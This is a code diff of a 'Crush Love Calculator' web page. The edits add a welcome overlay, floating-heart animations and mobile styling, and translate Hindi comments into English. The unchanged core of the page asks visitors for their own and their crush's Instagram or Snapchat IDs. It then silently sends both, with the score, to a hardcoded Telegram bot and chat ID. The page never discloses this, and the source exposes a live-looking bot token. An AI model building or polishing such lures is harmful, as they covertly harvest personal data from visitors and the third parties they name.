@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -12,13 +12,39 @@
             color: white;
             text-align: center;
             font-family: 'Poppins', sans-serif;
-            height: 100vh;
+            min-height: 100vh; /* Ensure the body takes at least full viewport height */
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            overflow: hidden;
+            overflow: auto; /* Allow scrolling */
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 1s ease;
+        }
+
+        .overlay h1 {
+            font-size: 24px; /* Smaller font size */
+            color: #FF007F;
+            animation: fadeIn 1s forwards; /* Fade-in effect */
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .container {
@@ -29,6 +55,9 @@
             width: 90%;
             max-width: 500px;
             box-shadow: 0px 0px 20px rgba(255, 0, 127, 0.5);
+            opacity: 0; /* Initially hidden for animation */
+            display: none; /* Hide initially */
+            margin-top: 20px; /* Add margin to separate from the top */
         }
 
         h1 {
@@ -43,6 +72,8 @@
             border-radius: 8px;
             border: none;
             text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
         }
 
         button {
@@ -58,11 +89,36 @@
             transition: all 0.3s ease-in-out;
         }
 
+        button:hover {
+            background: linear-gradient(to right, #FF00FF, #FF007F);
+        }
+
         #result {
             margin-top: 20px;
             font-size: 20px;
             font-weight: bold;
             color: #FFD700;
+        }
+
+        .heart {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: red;
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+            opacity: 0;
+            animation: float 1.5s forwards;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-200px);
+                opacity: 0;
+            }
         }
 
         .share-buttons {
@@ -80,21 +136,43 @@
             color: black;
             box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.6);
         }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .overlay h1 {
+                font-size: 20px; /* Smaller font size for mobile */
+            }
+
+            .container {
+                padding: 20px; /* Less padding on mobile */
+            }
+
+            h1 {
+                font-size: 24px; /* Smaller heading for mobile */
+            }
+
+            button {
+                font-size: 14px; /* Smaller button text for mobile */
+            }
+
+            #result {
+                font-size: 18px; /* Smaller result text for mobile */
+            }
+        }
     </style>
 </head>
 <body>
 
-    <!-- 🎶 Romantic Music -->
-    <audio id="backgroundMusic" autoplay loop>
-        <source src="https://www.bensound.com/bensound-music/bensound-romantic.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
+    <!-- Welcome Overlay -->
+    <div class="overlay" id="welcomeOverlay">
+        <h1>Welcome to the Crush Love Calculator!</h1>
+    </div>
 
-    <div class="container">
+    <div class="container" id="mainContent">
         <h1>💕 Crush Love Calculator 💕</h1>
         <input type="text" id="userID" placeholder="Your Instagram/Snapchat ID">
         <input type="text" id="crushID" placeholder="Crush's Instagram/Snapchat ID">
-        <button onclick="calculateLove()">Calculate Love ❤️</button>
+        <button onclick="showHearts()">Calculate Love ❤️</button>
         <div id="result"></div>
         
         <!-- Romantic Story Video -->
@@ -115,8 +193,44 @@
     </div>
 
     <script>
-        const BOT_TOKEN = "8193652778:AAHtfNipPNuNMwS4gEUwwDKV9RlED7W5nEg"; // 🔹 अपना Telegram Bot Token डालो
-        const CHAT_ID = "6423851220"; // 🔹 अपना Telegram Chat ID डालो
+        const BOT_TOKEN = "8193652778:AAHtfNipPNuNMwS4gEUwwDKV9RlED7W5nEg"; // Replace with your Telegram Bot Token
+        const CHAT_ID = "6423851220"; // Replace with your Telegram Chat ID
+
+        // Function to hide the welcome overlay and show the main content
+        function hideWelcome() {
+            const overlay = document.getElementById('welcomeOverlay');
+            overlay.style.opacity = '0'; // Fade out the overlay
+            setTimeout(() => {
+                overlay.style.display = 'none'; // Hide the overlay after fade out
+                document.getElementById('mainContent').style.display = 'block'; // Show main content
+                document.getElementById('mainContent').style.opacity = '1'; // Ensure main content is visible
+            }, 1000); // Match the timeout with the CSS transition duration
+        }
+
+        // Call hideWelcome after a delay
+        window.onload = function() {
+            setTimeout(hideWelcome, 500); // Show overlay for 0.5 seconds
+        };
+
+        function showHearts() {
+            for (let i = 0; i < 20; i++) {
+                createHeart();
+            }
+            calculateLove();
+        }
+
+        function createHeart() {
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.style.left = Math.random() * 100 + 'vw'; // Random horizontal position
+            heart.style.animationDelay = Math.random() * 1 + 's'; // Random delay
+            document.body.appendChild(heart);
+
+            // Remove heart after animation
+            heart.addEventListener('animationend', () => {
+                heart.remove();
+            });
+        }
 
         function calculateLove() {
             let userID = document.getElementById("userID").value.trim();
@@ -127,7 +241,7 @@
                 return;
             }
 
-            // 🔹 अगर यूजर ने "@" नहीं डाला, तो खुद ऐड कर देंगे
+            // If userID or crushID does not start with "@", add it
             if (!userID.startsWith("@")) userID = "@" + userID;
             if (!crushID.startsWith("@")) crushID = "@" + crushID;
 
@@ -146,7 +260,7 @@
         }
 
         function sendToTelegram(userID, crushID, loveScore) {
-            let message = `💘 *New Love Calculation!* 💘\n\n👤 *User :* ${userID}\n❤️ *Crush:* ${crushID}\n💯 *Love Score:* ${loveScore}%\n\n🔮 *Will they confess? Let's see!*`;
+            let message = `💘 *New Love Calculation!* 💘\n\n👤 *User         :* ${userID}\n❤️ *Crush:* ${crushID}\n💯 *Love Score:* ${loveScore}%\n\n🔮 *Will they confess? Let's see!*`;
 
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
